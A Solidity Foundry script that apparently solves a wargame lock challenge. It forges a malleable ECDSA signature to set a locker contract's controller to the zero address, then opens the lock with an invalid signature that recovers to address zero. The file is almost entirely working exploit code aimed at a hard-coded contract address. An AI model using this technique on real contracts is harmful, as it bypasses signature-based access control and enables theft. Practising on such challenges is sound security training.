// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import "forge-std/Script.sol";

contract InpersonatorScript is Script {
    event Open(address indexed opener, uint256 timestamp);

    function run() public {
        uint256 pk = vm.envUint("PK");

        vm.startBroadcast(pk);
        IECLocker locker = IECLocker(0xe233Ab71Bac656546BD537C0dFE23d7f38be44aA);

        // 27 1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91
        // 78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2
        // locker.changeController(
        //     27,
        //     0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91,
        //     0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2,
        //     address(0)
        // );

        //0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91,
        (bool success, bytes memory response) = address(locker).call(
            abi.encodeWithSelector(
                locker.changeController.selector,
                0x1c,
                0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91,
                0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f,
                address(0)
            )
        );

        if (!success) {
            if (response.length == 4) {
                bytes4 selector;
                assembly {
                    selector := mload(add(response, 0x20))
                }
                if (selector == IECLocker.InvalidController.selector) {
                    console.log("Invalid Controller");
                }
                if (selector == IECLocker.SignatureAlreadyUsed.selector) {
                    console.log("Signature Already Used");
                }
            } else {
                console.log("Somethig Went Wrong");
            }
        }
        // address addr = ecrecover(
        //     locker.msgHash(),
        //     0x1,
        //     0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b92,
        //     0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2
        // );
        vm.expectEmit();
        emit Open(address(0), block.timestamp);
        locker.open(
            0x1,
            0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b92,
            0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2
        );

        vm.stopBroadcast();
    }
}

interface IImpersonator {
    event NewLock(address indexed lockAddress, uint256 lockId, uint256 timestamp, bytes signature);

    /// @notice Returns the current lock counter value
    function lockCounter() external view returns (uint256);

    /// @notice Returns the deployed lock contract addresses in an array
    function lockers(uint256 index) external view returns (address);

    /// @notice Deploys a new `ECLocker` instance and increments the lock counter
    /// @param signature The signature to initialize the lock with
    function deployNewLock(bytes memory signature) external;
}

interface IECLocker {
    event LockInitializated(address indexed initialController, uint256 timestamp);
    event Open(address indexed opener, uint256 timestamp);
    event ControllerChanged(address indexed newController, uint256 timestamp);

    error InvalidController();
    error SignatureAlreadyUsed();

    /// @notice Returns the unique lock ID
    function lockId() external view returns (uint256);

    /// @notice Returns the hash of the message used in signature verification
    function msgHash() external view returns (bytes32);

    /// @notice Returns the current controller address
    function controller() external view returns (address);

    /// @notice Checks if a given signature hash has already been used
    /// @param _signatureHash The keccak256 hash of the signature
    function usedSignatures(bytes32 _signatureHash) external view returns (bool);

    /// @notice Opens the lock if the signature is valid
    /// @param v The recovery id
    /// @param r The r component of the signature
    /// @param s The s component of the signature
    function open(uint8 v, bytes32 r, bytes32 s) external;

    /// @notice Changes the controller address if the signature is valid
    /// @param v The recovery id
    /// @param r The r component of the signature
    /// @param s The s component of the signature
    /// @param newController The new controller address to set
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}
